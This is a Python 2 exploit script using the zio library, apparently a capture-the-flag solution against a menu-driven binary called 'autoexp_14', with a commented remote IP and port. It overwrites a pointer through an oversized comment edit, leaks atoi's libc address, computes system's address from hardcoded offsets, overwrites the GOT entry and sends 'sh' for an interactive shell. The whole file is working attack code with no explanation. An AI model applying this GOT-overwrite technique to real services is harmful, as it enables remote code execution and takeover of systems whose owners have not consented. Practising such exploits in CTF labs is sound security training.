from threading import Thread
# from uploadflag import *
from zio import *

target = ('119.254.101.197', 10000)
target = './autoexp_14'


def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)

def add_function(io, name, para, data):
    io.read_until('Option:')
    io.writeline('1')
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(para+'\n')
    io.read_until(':')
    io.writeline(data+'\n')

def show_function(io, index):
    io.read_until('Option:')
    io.writeline('4')
    io.read_until('back:')
    io.writeline(str(index))

def delete_function(io, index):
    io.read_until('Option:')
    io.writeline('2')
    io.read_until('back:')
    io.writeline(str(index))

def build(io):
    io.read_until('Option:')
    io.writeline('5')

def add_start_part(io, name, start_part):
    io.read_until('Option:')
    io.writeline('6')
    io.read_until('Option')
    io.writeline('1')
    io.read_until(':')
    io.writeline(name)
    io.read_until(':')
    io.writeline(start_part)


def add_end_part(io, end_part):
    io.read_until('Option:')
    io.writeline('6')
    io.read_until('Option')
    io.writeline('2')
    io.read_until(':')
    io.writeline(end_part)

def add_read_write(io, readall, writeall):
    io.read_until('Option:')
    io.writeline('6')
    io.read_until('Option')
    io.writeline('3')
    io.read_until('read')
    io.writeline(readall)
    io.read_until('write')
    io.writeline(writeall)

def enter_edit(io, index):
    io.read_until('Option:')
    io.writeline('3')
    io.read_until('back:')
    io.writeline(str(index))

def exit_edit(io):
    io.read_until('Option:')
    io.writeline('0')

def edit_comments(io, length, comment):
    io.read_until('Option:')
    io.writeline('9')
    io.writeline(str(length))
    io.writeline(comment)

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    add_function(io, 'fun1', 'para1', 'data1')
    add_function(io, 'fun2', 'para2', 'data2')
    enter_edit(io, 2)

    atoi_got = 0x603230
    edit_comments(io, 666, 'a'*0x18+l64(atoi_got))

    #fun1 0x604070
    #fun2 0x604200 comment:0x604390
    delete_function(io, 2)


    add_function(io, 'fun3', 'para3', 'data3')
    add_function(io, 'fun4', 'para4', 'data4')
    add_function(io, 'fun5', 'para5', 'data5')


    show_function(io, 3)
    io.read_until('#')
    atoi = l64(io.readline()[:-1].ljust(8, '\x00'))
    print hex(atoi)

    base = atoi - 0x0000000000036E80
    system = base + 0x0000000000045390

    #base = atoi - 0x0000000000033C10
    #system = base + 0x000000000003E8B0

    enter_edit(io, 3)
    edit_comments(io, 8, l64(system)[:-1])
    io.read_until('Option')
    io.writeline('sh')

    interact(io)


exp(target)
